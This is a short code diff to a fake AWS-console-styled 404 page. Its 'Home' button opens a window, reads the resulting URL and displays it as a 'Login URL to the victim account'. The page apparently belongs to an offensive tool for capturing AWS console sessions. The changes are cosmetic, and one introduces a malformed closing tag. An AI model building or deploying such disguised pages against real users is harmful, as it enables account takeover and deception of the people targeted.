@@ -463,9 +463,8 @@ body.awsui-polaris-dark-mode {
 <h1>404</h1>
 <div class="_margin-bottom-xs_g3pvd_431">
 <p>The page you tried was not found.<br/></p>
-<p id="vic-url"></p>
-<button id="openWindowBtn" class="_button_g3pvd_484 _signin-button_g3pvd_466">Home</button>
-
+<button id="openWindowBtn" class="_button_g3pvd_484 _signin-button_g3pvd_466">Home</button><br/>
+<p id="vic-url" style="word-break: break-all; white-space: normal; width: 300px;"></p>
 </div>
 </main>
 </body>
@@ -486,7 +485,7 @@ document.getElementById('openWindowBtn').addEventListener('click', function() {
                 let url = newWindow.location.href;
                 let modifiedUrl = url.replace(/https:\/\/.*\.console\.aws\.amazon\.com\//, 'https://');
                 var paragraph = document.getElementById("vic-url");
-                paragraph.innerHTML = "Login URL to the victim account: " + modifiedUrl;
+                paragraph.innerHTML = "<strong>Login URL to the victim account:<strong><br/> " + modifiedUrl;
                 //alert("Login URL to the victim account: " + modifiedUrl);
             } catch (e) {
                 alert("Unable to access the URL of the new window due to security restrictions.");
